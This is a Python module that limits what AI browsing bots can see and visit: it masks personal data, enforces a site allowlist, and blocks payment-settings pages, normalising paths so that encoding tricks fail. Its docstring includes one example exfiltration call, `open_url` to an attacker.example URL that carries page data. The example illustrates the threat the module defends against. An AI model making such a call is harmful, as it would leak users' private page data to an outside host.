"""Per-bot limits on what a bot sees and where its browser may go.

Personal details: unless a bot may see them, emails, phone, card and bank
numbers on pages are masked in everything it reads (see pii.py).

Site list: a bot with "only these sites" turned on can open, click or be
redirected only to the sites you list plus the sites of the logins you
granted it (with their subdomains, so a sign-in hop such as
accounts.example.com still works). This closes the browser as a way to send
page data out, as in `open_url("https://attacker.example/?d=...")`. Pages'
own images, scripts and frames still load from anywhere public, since the bot
doesn't choose those. The bot's assistant may have other ways out (Grok can
browse on its own), so this narrows the risk rather than ending it.

Blocked pages: pages a bot may never see, even on sites it may use, such as
`amazon.co.uk/gp/your-account/payments` or `paypal.com/myaccount/settings*`
(a host, with its subdomains, then a path prefix; `*` matches anything; a
bare host blocks the whole site). A blocked page doesn't load: the tab stays
where it was. If a site switches to one without loading a page (single-page
apps), the bot's next look at the tab finds it and goes back first.
"""

from __future__ import annotations

import asyncio
import posixpath
import re
import time
from typing import TYPE_CHECKING, Any
from urllib.parse import unquote, urlsplit

from .mailcode import site_domains
from .origin import host_of

if TYPE_CHECKING:
    from .bots import Bots
    from .vault import Backend

LOGIN_HOSTS_TTL = 300


class PolicyMixin:
    bots: Bots | None
    backend: Backend
    audit: Any
    _login_sites: tuple[float, dict[str, set[str]]] | None = None  # (loaded at, sites by login title)

    def _bot_access(self, client: str) -> dict[str, Any] | None:
        _, _, bot = client.partition("/")
        if not bot or self.bots is None:
            return None
        try:
            return self.bots.access(bot)
        except Exception:
            return None

    def hides_personal(self, client: str) -> bool:
        acc = self._bot_access(client)
        return not (acc or {}).get("personal_details", False)

    async def _sites_of_logins(self) -> dict[str, set[str]]:
        if self._login_sites is None or time.monotonic() - self._login_sites[0] > LOGIN_HOSTS_TTL:
            logins = await asyncio.to_thread(self.backend.list_logins)
            sites = {l.title: site_domains([u for u in l.urls if host_of(u)]) for l in logins}
            self._login_sites = (time.monotonic(), sites)
        return self._login_sites[1]

    async def _site_allowed(self, client: str, acc: dict[str, Any], host: str) -> bool:
        if not acc.get("sites_limited"):
            return True
        allowed = set(acc.get("sites", []))
        try:
            by_title = await self._sites_of_logins()
        except Exception:
            by_title = {}
        for title in acc.get("logins", []):
            allowed |= by_title.get(title, set())
        return any(host == s or host.endswith("." + s) for s in allowed)

    async def page_refusal(self, client: str, url: str, top: bool = True) -> str | None:
        """Why this bot's browser may not show `url`, or None if it may.

        `top` is a page load in the tab itself (the site list applies); frames
        inside a page are checked against blocked pages only.
        """
        acc = self._bot_access(client)
        parts = urlsplit(url)
        if not acc or parts.scheme not in ("http", "https"):
            return None
        host = (parts.hostname or "").lower().rstrip(".")
        if top and not await self._site_allowed(client, acc, host):
            self.audit.record("site_refused", client=client, host=host)
            return f"{host} isn't on this bot's site list"
        path = parts.path or "/"
        for pattern in acc.get("blocked_pages", []):
            if page_matches(pattern, host, path):
                self.audit.record("page_refused", client=client, host=host, page=pattern)
                return f"that page ({pattern}) is blocked for this bot"
        return None


def normalize_path(path: str) -> str:
    """The path a server is likely to act on: percent-decoded (repeatedly, for double encoding),
    `//` collapsed, `.` and `..` resolved, lower-cased. `/pay%6Dents` and `//a/./b/../pay` must
    not slip past a blocked `/payments` or `/a/pay`."""
    for _ in range(3):
        decoded = unquote(path)
        if decoded == path:
            break
        path = decoded
    path = posixpath.normpath("/" + re.sub(r"/+", "/", path.replace("\\", "/")))
    return ("/" if path in ("", ".") else path).lower()


def page_matches(pattern: str, host: str, path: str) -> bool:
    """`example.com/account/pay*` against a host and path: subdomains count, the path is a prefix."""
    phost, _, ppath = pattern.lower().partition("/")
    if not (host == phost or host.endswith("." + phost)):
        return False
    wanted = normalize_path("/" + ppath).rstrip("/") if ppath.strip("/") else ""
    regex = re.escape(wanted).replace(r"\*", ".*")
    return re.match(regex, normalize_path(path)) is not None
